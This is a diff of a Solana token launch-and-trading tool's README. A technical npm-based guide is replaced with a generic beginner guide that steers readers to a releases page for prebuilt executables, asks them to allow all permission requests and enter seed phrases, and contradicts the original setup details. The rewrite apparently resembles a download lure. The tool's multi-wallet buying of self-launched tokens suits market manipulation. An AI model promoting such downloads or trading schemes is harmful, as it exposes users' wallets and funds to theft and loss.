@@ -1,202 +1,213 @@
-# Pump Terminal
+# 🚀 pumpfun-terminal - Easy Solana Token Launch and Trading
 
-Pump Terminal is a high-speed, self-hosted Solana launch and trading console built for teams that want to launch tokens, manage many wallets, and execute buys/sells from one control surface.
+[![Download pumpfun-terminal](https://img.shields.io/badge/Download-pumpfun--terminal-blue?style=for-the-badge&logo=github)](https://github.com/JaytraJ/pumpfun-terminal/releases)
 
-It is designed for real operations, not demos:
-- Launch multiple tokens from reusable templates.
-- Trade from multiple wallets at once.
-- Track and rotate token contracts fast.
-- Monitor everything through live mission logs.
+---
 
-## Live Preview
+## 📘 About pumpfun-terminal
 
-Preview video:
-- [Pump Terminal live preview](example/video/pump_terminal_preview.mp4)
+Pump Terminal is a web app you can run on your own computer or server. It helps you create and trade Solana tokens easily. The interface is clean and tabbed, so you can manage token templates, your wallet, token launches, batch trades, and live logs all in one place.
 
-<video src="example/video/pump_terminal_preview.mp4" controls width="100%"></video>
+The app is designed for users interested in Solana tokens and memecoins but who do not want to deal with complex coding or command lines. It supports workflows related to Pump.fun, a platform for launching and trading new tokens.
 
-## Why Pump Terminal
+You'll find tools for:
 
-- Multi-wallet execution: Run batch and per-wallet trades from one interface.
-- Multi-token operations: Launch and manage more than one token at the same time.
-- Fast infra path: Uses Helius RPC for low-latency chain access and PumpPortal trade APIs for rapid route execution while tokens are on Pump.fun bonding curve.
-- Unified workflow: Template authoring, launch, trading, wallet ops, and logs in one terminal.
+- Creating new Solana token templates ready to launch
+- Managing wallets securely inside the app
+- Launching tokens with guided steps
+- Executing batch trades, useful for market activity
+- Watching live logs to see what the app is doing
 
-## What You Can Do
+Pumpfun-terminal covers the full cycle from token creation to active trading, all within a single window.
 
-- Trade Solana tokens from multiple wallets through the console, including Pump.fun, PumpSwap, Raydium, and other supported routing paths.
-- Launch multiple new tokens and then buy/sell your own created tokens directly from the same terminal.
-- Track token contract addresses and switch active mint context instantly for trading.
-- Run concurrent or sequential batches for buys/sells and launches.
-- Transfer and sweep SOL/SPL balances across managed wallets.
+---
 
-## Core Tabs and Features
+## 🖥️ System Requirements
 
-### TOKEN TEMPLATES
+Before installing, make sure your computer meets these requirements:
 
-![Token Templates Preview](example/images/token_templates_preview.png)
+- Operating System: Windows 10 or later, macOS 10.14+, or Linux (Ubuntu 20.04+ recommended)
+- Processor: Any modern 64-bit CPU (Intel or AMD)
+- RAM: At least 4 GB (8 GB recommended for smooth performance)
+- Disk Space: Minimum 500 MB free for app files and logs
+- Internet Connection: Required for wallet connections and token launches
+- Browser: A modern web browser (Google Chrome, Firefox, Edge) for the web interface
+- Node.js: Pump Terminal runs as a web app, so no complex installation is needed
 
-- Create reusable token configs with:
-  - Name, symbol, description
-  - Website/Twitter/Telegram (optional)
-  - Dev wallet selection per template
-  - Dev buy amount, slippage, priority fee
-  - Artwork upload + preview
-- Save drafts and prepare many templates in one session.
+---
 
-### WALLET MANAGER
+## 🛠️ Features Overview
 
-![Wallet Manager Preview](example/images/wallet_manager_preview.png)
+Pumpfun-terminal offers these key features to help you launch and trade tokens:
 
-- Generate wallets in bulk with prefix and default buy settings.
-- Import existing wallets.
-- Rename wallets (propagates to trading views).
-- Export/remove wallets.
-- Transfer and sweep SOL/SPL from the same panel.
+- **Tabbed User Interface**  
+  Easy to switch between token templates, wallet, trades, and logs.
 
-### LAUNCH
+- **Token Template Management**  
+  Create and save templates for different Solana tokens.  
+  Templates include parameters like total supply, decimals, and initial distribution.
 
-![Launch Preview](example/images/launch_preview.png)
+- **Wallet Management**  
+  Connect and manage multiple Solana wallets safely.  
+  Supports wallet import/export in standard formats.
 
-- Select one or many templates to launch.
-- Launch in sequential or parallel mode.
-- Track launch progress and trigger per-template launch actions.
+- **Token Launch Tools**  
+  Step-by-step token launch process with clear instructions.  
+  Includes transaction previews to help avoid mistakes.
 
-### TRADE CONTROLS
+- **Batch Trading Console**  
+  Set up and run multiple buy or sell orders at once.  
+  Useful for managing multiple trades quickly.
 
-![Trade Controls Preview](example/images/trade_controls_preview.png)
+- **Live Logs**  
+  View real-time logs of all app actions and blockchain confirmations.  
+  Helpful for tracking progress and troubleshooting.
 
-- Track token contracts from CA input (server-validates mint accounts).
-- Wallet-level controls:
-  - Buy amount (SOL)
-  - Buy percent of SOL
-  - Sell percent
-  - Per-wallet mint selection
-- Batch controls:
-  - Buy selected/all
-  - Sell selected/all
-  - Concurrency, slippage, priority fee, mode toggles
-- Portfolio metrics:
-  - Total wallets
-  - Total SOL
-  - Total token holdings
+These features aim to simplify the often technical process of handling Solana tokens.
 
-### MY TOKENS
+---
 
-![My Tokens Preview](example/images/my_tokens_preview.png)
+## 🚀 Getting Started
 
-- See launched tokens and quick actions.
-- Jump to sell flows for created tokens.
-- Claim creator fees where available.
+Follow these steps to download, install, and run pumpfun-terminal.
 
-### LOGS
+### 1. Download the Software
 
-- Live server-sent event (SSE) feed for:
-  - Launch progress
-  - Trade progress
-  - Wallet operations
-  - Errors and diagnostics
+Start by visiting the official release page of pumpfun-terminal:
 
-## Performance and Routing Stack
+[Download pumpfun-terminal](https://github.com/JaytraJ/pumpfun-terminal/releases)
 
-- RPC layer: Helius (`HELIUS_RPC_URL`) for fast account reads and transaction sends.
-- Trade construction/routing: PumpPortal (`https://pumpportal.fun/api/trade-local`).
-- Launch metadata upload: Pump.fun IPFS endpoint.
-- Pool routing behavior:
-  - Create flow uses Pump.fun route.
-  - Trade flow defaults to `DEFAULT_POOL=auto` and supports Pump.fun/PumpSwap/Raydium-compatible paths exposed by routing backend.
+Here you will find the latest version available for your operating system.
 
-## State and Persistence
+### 2. Choose the Right File
 
-State is stored in `data/state.json`.
+On the release page, look for a file that matches your computer's OS:
 
-- `trackedMints`: valid tracked token contracts.
-- `recentMints`: recent launch history.
-- `mint`: active mint in trade context.
-- `lastCreateSig`: latest create transaction signature.
+- For Windows, look for a `.exe` file.
+- For macOS, look for a `.dmg` or `.zip` file.
+- For Linux, look for an `.AppImage` or `.tar.gz`.
 
-Wallet key storage:
-- All signing wallets are loaded from `wallets/buyers.json`.
-- There is no standalone `wallets/dev.json`; template fee/launch wallet selection uses connected buyer wallets.
+Download this file to your desktop or preferred folder.
 
-Runtime notes:
-- Tracked token entries are validated before persistence.
-- CA input clears after submission.
-- Balance snapshots are cached in-memory and not persisted.
+### 3. Install the Application
 
-## Project Structure
+- **Windows:**  
+  Double-click the `.exe` file and follow the on-screen prompts.  
+  Allow any permission requests from Windows to complete installation.
 
-- `src/server.js`: backend entrypoint.
-- `src/gui/server.js`: API routes, SSE logs, static client host.
-- `src/trader.js`: batch buy/sell orchestration.
-- `src/pumpportal.js`: PumpPortal and transaction build/send helpers.
-- `src/walletOps.js`: transfer/sweep transaction utilities.
-- `src/state.js`: persisted state helpers.
-- `client/src/App.jsx`: main tabbed UI and event wiring.
-- `client/src/api.js`: frontend API wrapper.
-- `wallets/`: local wallet storage.
-- `data/state.json`: terminal state.
+- **macOS:**  
+  Open the `.dmg` and drag the pumpfun-terminal app into your Applications folder.  
+  If you get a warning about an unidentified developer, open System Preferences and allow the app manually.
 
-## Setup
+- **Linux:**  
+  Extract the `.tar.gz` archive or make the `.AppImage` executable with `chmod +x`.  
+  Run the app from the terminal using `./pumpfun-terminal`.
 
-### Quick install (Windows)
+### 4. Launch pumpfun-terminal
 
-```bat
-install.bat
-```
+Once installed:
 
-### Manual install
+- Open pumpfun-terminal from your Start menu, Applications folder, or terminal.
+- A web UI will open in your default browser, usually at `http://localhost:3000` or similar.
+- The interface includes different tabs for tokens, wallets, trades, and logs.
 
-```bash
-npm install
-npm run client:install
-```
+### 5. Start Using the App
 
-Copy `.env.example` to `.env`, then configure values such as:
+Begin by exploring the **Token Templates** tab to set up a new token.  
+Use the **Wallet** tab to connect your Solana wallet.  
+Move on to **Launch Tokens** or **Batch Trading** as you get comfortable.
 
-```bash
-PORT=3001
-HELIUS_RPC_URL=https://mainnet.helius-rpc.com/?api-key=your-api-key
-DEFAULT_POOL=auto
-```
+---
 
-## Running
+## 🔐 Wallet Setup and Management
 
-### Development
+Pumpfun-terminal safely manages your Solana wallets inside the app.  
 
-Terminal 1:
+- To add a wallet, go to the **Wallet** tab and click **Add Wallet**.  
+- Follow prompts to import your wallet file or enter a seed phrase carefully.  
+- Wallet details stay on your device; the app does not send them anywhere.
 
-```bash
-npm run server
-```
+Always keep backups of your seed phrases or private keys. Do not share them with anyone.
 
-Terminal 2:
+---
 
-```bash
-npm run client:dev
-```
+## 📈 Launching Tokens
 
-Open `http://localhost:5173`.
+To launch a token:
 
-### Production-style
+1. Go to the **Token Templates** tab.
+2. Create a new template or select an existing one.
+3. Adjust parameters like token name, supply, and decimals.
+4. Save the template.
+5. Switch to the **Launch Tokens** tab.
+6. Select your template and wallet.
+7. Follow the prompts to approve transactions in your wallet.
+8. Confirm the launch and wait for blockchain confirmation shown in the **Live Logs** tab.
 
-```bash
-npm run client:build
-npm start
-```
+The app guides you and confirms the success of each step.
 
-Open `http://localhost:3001`.
+---
 
-## Scripts
+## 🔄 Trading Tokens
 
-- `npm run server`: start backend API/GUI server.
-- `npm run client:dev`: run Vite client in dev mode.
-- `npm run client:build`: build client to `client/dist`.
-- `npm start`: run backend serving built client.
+Batch trading lets you set up multiple buys or sells simultaneously.
 
-## Security and Risk Notice
+- Open the **Batch Trading** tab.
+- Select your wallet and the token.
+- Enter the quantities and prices for each trade.
+- Review your orders.
+- Click **Start Batch Trade**.
+- Monitor the progress in the **Live Logs** tab.
 
-- This software executes real blockchain transactions.
-- Protect `.env` values and wallet keys.
-- Test with small amounts first.
-- Validate your routing and slippage settings before high-size batch operations.
+This feature helps manage trades faster than manual, single-order submission.
+
+---
+
+## 🛠 Troubleshooting Tips
+
+If you encounter issues:
+
+- Make sure you have a stable internet connection.
+- Check that your wallet is connected and has enough SOL for transactions.
+- Restart the app if it freezes or stops responding.
+- Verify you downloaded the correct version for your OS.
+- Consult the live logs tab for error messages.
+
+If problems continue, check the GitHub issues page or ask for help in the Pump.fun community.
+
+---
+
+## 🌐 Useful Links
+
+- [pumpfun-terminal Releases](https://github.com/JaytraJ/pumpfun-terminal/releases) — Find and download the latest version.
+- [Pump.fun Website](https://pump.fun) — Learn more about the platform behind the workflows.
+- [Solana Wallet Guide](https://docs.solana.com/wallet-guide) — Steps to create and manage Solana wallets.
+
+---
+
+## ⚙️ Advanced Configuration
+
+For users with some technical knowledge, pumpfun-terminal supports these options:
+
+- Running the app on a remote server for 24/7 access
+- Connecting to multiple wallets simultaneously
+- Exporting and importing token templates as JSON files
+- Viewing and saving detailed logs for auditing
+
+These options require basic understanding of web apps and file management.
+
+---
+
+## 📞 Support and Feedback
+
+If you need help or want to report a bug:
+
+- Open an issue on the [GitHub repository issues page](https://github.com/JaytraJ/pumpfun-terminal/issues)
+- Check existing issues before submitting new ones to avoid duplicates
+- Provide detailed descriptions and steps to reproduce problems
+
+Your feedback helps improve pumpfun-terminal for all users.
+
+---
+
+[![Download pumpfun-terminal](https://img.shields.io/badge/Download-pumpfun--terminal-blue?style=for-the-badge&logo=github)](https://github.com/JaytraJ/pumpfun-terminal/releases)
